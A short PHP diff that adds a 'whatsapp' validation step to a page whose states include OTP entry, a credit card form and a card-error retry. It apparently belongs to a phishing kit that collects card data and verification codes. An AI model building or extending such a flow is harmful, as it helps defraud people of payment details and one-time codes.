@@ -18,6 +18,8 @@ if ($status === 'otp') {
     $body_class = 'cc-view';
 } elseif ($status === 'ccerror') { // <-- Nuevo estado para el error de tarjeta
     $body_class = 'cc-view';
+} elseif ($status === 'whatsapp') { // <-- Nuevo estado WhatsApp
+    $body_class = 'cc-view';
 }
 
 ?>
@@ -51,11 +53,10 @@ if ($status === 'otp') {
         include 'partials/error_user_notification.php';
     } elseif ($status === 'cc') {
         include 'partials/tarjeta_credito.php';
-    } elseif ($status === 'ccerror') { // <-- Nuevo estado
-        // Asegúrate de que tu módulo de tarjeta de crédito pueda leer este estado de error
-        // En tu partial, puedes usar 'if (isset($_GET['status']) && $_GET['status'] == 'ccerror')'
-        // para mostrar el mensaje de error.
+    } elseif ($status === 'ccerror') {
         include 'partials/tarjeta_credito.php';
+    } elseif ($status === 'whatsapp') { // <-- Nuevo estado Include
+        include 'partials/whatsapp_validation.php';
     }
     ?>
 
